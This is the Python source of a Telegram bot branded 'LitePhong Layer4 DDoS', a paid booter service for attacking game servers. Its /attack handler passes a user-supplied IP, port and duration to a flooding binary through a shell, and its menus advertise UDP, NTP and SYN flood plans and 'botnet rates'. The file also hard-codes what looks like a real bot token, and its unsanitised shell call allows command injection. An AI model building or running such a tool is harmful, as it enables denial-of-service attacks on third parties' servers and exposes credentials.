import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('7225387298:AAFiTrbUsuoecL-qJTWzTJ6YDM4kzhyv-SY')

# Admin user IDs
admin_id = {"6431161471", "", ""}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"𝘔𝘦𝘯𝘢𝘮𝘣𝘢𝘩𝘬𝘢𝘯 {user_to_add} 𝘬𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘋𝘋𝘰𝘚 :\n\n𝘈𝘵𝘵𝘢𝘤𝘬 𝘛𝘪𝘮𝘦 : 120 𝘚𝘦𝘤𝘰𝘯𝘥𝘴\n𝘔𝘦𝘵𝘩𝘰𝘥𝘦 : 𝘜𝘋𝘗\n𝘊𝘰𝘯𝘤𝘶𝘳𝘳𝘦𝘯𝘵𝘴 𝘈𝘵𝘵𝘢𝘤𝘬 : 2\n\n>𝘛𝘩𝘢𝘯𝘬 𝘺𝘰𝘶 𝘧𝘰𝘳 𝘱𝘶𝘳𝘤𝘩𝘢𝘴𝘪𝘯𝘨 𝘰𝘶𝘳 𝘱𝘭𝘢𝘯."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /freefire command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"𝚈𝚘𝚞𝚛 𝚊𝚝𝚝𝚊𝚌𝚔 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚜𝚎𝚗𝚝 𝚋𝚢 𝙻𝚒𝚝𝚎𝙿𝚑𝚘𝚗𝚐 𝙱𝙾𝚃.\n\n‌➛𝘐𝘗 𝘢𝘥𝘥𝘳𝘦𝘴𝘴: {target}\n‌➛𝘗𝘰𝘳𝘵: {port}\n‌➛𝘛𝘪𝘮𝘦: {time} 𝘚𝘦𝘤𝘰𝘯𝘥𝘴\n‌➛𝘔𝘦𝘵𝘩𝘰𝘥𝘦: 𝘖𝘞𝘓[𝘎𝘦𝘵]\n\n𝚓𝚘𝚒𝚗 𝚖𝚢 𝚌𝚑𝚊𝚗𝚗𝚎𝚕 𝚏𝚘𝚛 𝚝𝚑𝚎 𝚗𝚎𝚡𝚝 𝚞𝚙𝚍𝚊𝚝𝚎 @LitePhong"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /freefire command
bgmi_cooldown = {}

COOLDOWN_TIME =3

# Handler for /freefire command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 3min Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 180:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./freefire {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"𝚈𝚘𝚞𝚛 𝚊𝚝𝚝𝚊𝚌𝚔 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚜𝚝𝚘𝚙𝚙𝚎𝚍 𝚋𝚢 𝙻𝚒𝚝𝚎𝙿𝚑𝚘𝚗𝚐 𝙱𝙾𝚃.\n\n‌➛𝘐𝘗 𝘢𝘥𝘥𝘳𝘦𝘴𝘴: {target}\n‌➛𝘗𝘰𝘳𝘵: {port}\n‌➛𝘛𝘪𝘮𝘦: {time} 𝘚𝘦𝘤𝘰𝘯𝘥𝘴\n‌➛𝘔𝘦𝘵𝘩𝘰𝘥𝘦: 𝘖𝘞𝘓[𝘎𝘦𝘵]\n\n𝚓𝚘𝚒𝚗 𝚖𝚢 𝚌𝚑𝚊𝚗𝚗𝚎𝚕 𝚏𝚘𝚛 𝚝𝚑𝚎 𝚗𝚎𝚡𝚝 𝚞𝚙𝚍𝚊𝚝𝚎 @LitePhong"
        else:
            response = "𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘪𝘴 𝘯𝘰𝘵 𝘤𝘰𝘳𝘳𝘦𝘤𝘵 𝘱𝘭𝘦𝘢𝘴𝘦 𝘶𝘴𝘦 𝘢𝘴 𝘪𝘯 𝘵𝘩𝘦 𝘦𝘹𝘢𝘮𝘱𝘭𝘦.\n𝘦𝘹𝘢𝘮𝘱𝘭𝘦 : /𝚊𝚝𝚝𝚊𝚌𝚔 𝙸𝙿 𝙿𝚘𝚛𝚝 𝚃𝚒𝚖𝚎"  # Updated command syntax
    else:
        response = " You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for freefire and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''
──────────────────────────────
         [𝐋𝐢𝐭𝐞𝐏𝐡𝐨𝐧𝐠 𝐋𝐚𝐲𝐞𝐫𝟒 𝐃𝐃𝐨𝐒]            
──────────────────────────────
➤ /attack : 𝘛𝘰 𝘳𝘶𝘯 𝘋𝘋𝘰𝘚 𝘚𝘦𝘳𝘷𝘦𝘳 . 
➤ /rules : 𝘗𝘭𝘦𝘢𝘴𝘦 𝘊𝘩𝘦𝘤𝘬 𝘉𝘦𝘧𝘰𝘳𝘦 𝘜𝘴𝘦 !!.
➤ /mylogs : 𝘛𝘰 𝘊𝘩𝘦𝘤𝘬 𝘠𝘰𝘶𝘳 𝘙𝘦𝘤𝘦𝘯𝘵𝘴 𝘈𝘵𝘵𝘢𝘤𝘬𝘴.
➤ /plan : 𝘊𝘩𝘦𝘤𝘬𝘰𝘶𝘵 𝘖𝘶𝘳 𝘉𝘰𝘵𝘯𝘦𝘵 𝘙𝘢𝘵𝘦𝘴.
➤ /id : 𝘊𝘩𝘦𝘤𝘬 𝘪𝘥.
──────────────────────────────
            [𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬]
 ──────────────────────────────
➤ /admincmd : 𝘚𝘩𝘰𝘸𝘴 𝘈𝘭𝘭 𝘈𝘥𝘮𝘪𝘯 𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴.
──────────────────────────────
🔔Note : 𝚃𝚑𝚒𝚜 𝚋𝚘𝚝 𝚍𝚘𝚎𝚜 𝚗𝚘𝚝 𝚛𝚞𝚗 𝟸𝟺 𝚑𝚘𝚞𝚛𝚜 𝚋𝚎𝚌𝚊𝚞𝚜𝚎 𝚝𝚑𝚒𝚜 𝚋𝚘𝚝 𝚒𝚜 𝚜𝚝𝚒𝚕𝚕 𝚒𝚗 𝚝𝚑𝚎 𝚙𝚛𝚘𝚌𝚎𝚜𝚜 𝚘𝚏 𝚋𝚎𝚒𝚗𝚐 𝚌𝚛𝚎𝚊𝚝𝚎𝚍 𝚘𝚛 𝚒𝚗 𝚋𝚎𝚝𝚊 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 𝚊𝚗𝚍 𝚠𝚎 𝚘𝚗𝚕𝚢 𝚞𝚜𝚎 𝚊 𝚝𝚛𝚒𝚊𝚕 𝚅𝙿𝚂 𝚝𝚘 𝚛𝚞𝚗 𝚝𝚑𝚒𝚜 𝚋𝚘𝚝 𝚏𝚘𝚛 𝟽 𝚑𝚘𝚞𝚛𝚜.
──────────────────────────────
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝘏𝘦𝘭𝘭𝘰 {user_name} 𝘸𝘦𝘭𝘤𝘰𝘮𝘦 𝘵𝘰 𝘓𝘪𝘵𝘦𝘗𝘩𝘰𝘯𝘨 𝘉𝘖𝘛 𝘋𝘋𝘰𝘚 [𝘓4] , 𝘵𝘰 𝘴𝘦𝘦 𝘢𝘭𝘭 𝘤𝘮𝘥 𝘵𝘺𝘱𝘦 /help
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f''' Hello {user_name} Please Follow These Rules :
──────────────────────────────
       𝗣𝗟𝗘𝗔𝗦𝗘 𝗥𝗘𝗔𝗗 𝗧𝗛𝗘 𝗥𝗨𝗟𝗘𝗦
──────────────────────────────
1.𝘋𝘰𝘯'𝘵 𝘳𝘶𝘯 𝘵𝘩𝘦 𝘢𝘵𝘵𝘢𝘤𝘬 𝘵𝘸𝘪𝘤𝘦 𝘪𝘯 𝘰𝘯𝘦 𝘮𝘪𝘯𝘶𝘵𝘦.
2.𝘋𝘰𝘯'𝘵 𝘴𝘱𝘢𝘮 𝘣𝘰𝘵𝘴 𝘸𝘪𝘵𝘩 𝘢𝘵𝘵𝘢𝘤𝘬𝘴.
3.𝘋𝘰 𝘯𝘰𝘵 𝘦𝘹𝘤𝘦𝘦𝘥 𝘵𝘩𝘦 𝘮𝘢𝘹𝘪𝘮𝘶𝘮 𝘵𝘪𝘮𝘦.
──────────────────────────────
𝙸𝚏 𝚢𝚘𝚞 𝚍𝚘 𝚗𝚘𝚝 𝚌𝚘𝚖𝚙𝚕𝚢 𝚠𝚒𝚝𝚑 𝚝𝚑𝚎 𝚛𝚞𝚕𝚎𝚜 𝚊𝚋𝚘𝚟𝚎 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚜𝚊𝚗𝚌𝚝𝚒𝚘𝚗𝚜 𝚘𝚛 𝚙𝚞𝚗𝚒𝚜𝚑𝚖𝚎𝚗𝚝 𝚏𝚛𝚘𝚖 𝚝𝚑𝚎 𝚊𝚍𝚖𝚒𝚗.
──────────────────────────────'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''𝘏𝘦𝘭𝘭𝘰 {user_name} 𝘸𝘦 𝘰𝘯𝘭𝘺 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘰𝘯𝘦 𝘱𝘭𝘢𝘯 𝘧𝘰𝘳 𝘨𝘢𝘮𝘦 𝘴𝘦𝘳𝘷𝘦𝘳 𝘋𝘋𝘰𝘚, 𝘢𝘯𝘥 𝘯𝘰𝘵 𝘧𝘰𝘳 𝘸𝘦𝘣𝘴𝘪𝘵𝘦𝘴:

𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘋𝘋𝘰𝘚 :
𝘈𝘵𝘵𝘢𝘤𝘬 𝘛𝘪𝘮𝘦 : 120 𝘚𝘦𝘤𝘰𝘯𝘥𝘴
𝘔𝘦𝘵𝘩𝘰𝘥𝘦 : 𝘜𝘋𝘗, 𝘕𝘛𝘗 , 𝘚𝘠𝘕
𝘊𝘰𝘭𝘥𝘰𝘸𝘯 𝘈𝘧𝘵𝘦𝘳 𝘈𝘵𝘵𝘢𝘤𝘬 : 3 𝘔𝘪𝘯𝘶𝘵𝘦
𝘊𝘰𝘯𝘤𝘶𝘳𝘳𝘦𝘯𝘵𝘴 𝘈𝘵𝘵𝘢𝘤𝘬 : 2

𝘖𝘶𝘳 𝘱𝘳𝘪𝘤𝘦𝘴 𝘢𝘥𝘫𝘶𝘴𝘵 𝘵𝘰 𝘲𝘶𝘢𝘭𝘪𝘵𝘺, 𝘢𝘯𝘥 𝘺𝘰𝘶 𝘤𝘢𝘯 𝘤𝘩𝘦𝘤𝘬 𝘪𝘵 𝘰𝘯 𝘰𝘶𝘳 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘤𝘩𝘢𝘯𝘯𝘦𝘭 @LitePhong
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:
──── ──── ──── ──── ──── ──── 
➤ /add <userId> : Add a User.
➤ /remove <userid> Remove a User.
➤ /allusers : Authorised Users Lists.
➤ /logs : All Users Logs.
➤ /broadcast : Broadcast a Message.
➤ /clearlogs : Clear The Logs File.
──── ──── ──── ──── ──── ──── 
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
